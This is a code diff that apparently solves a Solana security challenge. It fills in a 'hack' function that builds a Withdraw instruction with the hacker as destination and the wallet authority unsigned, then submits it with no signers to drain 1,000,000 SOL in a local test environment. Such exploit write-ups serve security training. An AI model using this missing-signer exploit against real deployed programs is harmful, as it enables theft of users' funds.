@@ -9,6 +9,9 @@ use solana_program::native_token::lamports_to_sol;
 
 use pocs::assert_tx_success;
 use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
+use solana_program::instruction::{AccountMeta, Instruction};
+use level1::{get_wallet_address, WalletInstruction};
+use borsh::BorshSerialize;
 
 struct Challenge {
     hacker: Keypair,
@@ -18,7 +21,32 @@ struct Challenge {
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
+    // @note - Hack steps
+    // 1) Create withdraw instruction with destination == hacker, authority_address without signature
+    // 2) Execute fake instruction
+
+    let fake_destination = challenge.hacker.pubkey();
+
+    let wallet_address = get_wallet_address(challenge.wallet_authority, challenge.wallet_program);
+    let fake_withdraw_ix = Instruction {
+        program_id: challenge.wallet_program,
+        accounts: vec![
+            AccountMeta::new(wallet_address, false),
+            AccountMeta::new(challenge.wallet_authority, false),
+            AccountMeta::new(fake_destination, false),
+            AccountMeta::new_readonly(system_program::id(), false),
+        ],
+        data: WalletInstruction::Withdraw { amount: sol_to_lamports(1_000_000.0) }.try_to_vec().unwrap(),
+    };
+
+    assert_tx_success(
+        env.execute_as_transaction(
+            &[fake_withdraw_ix],
+            &[] // empty signer
+        )
+    );
+}
 
 /*
 SETUP CODE BELOW
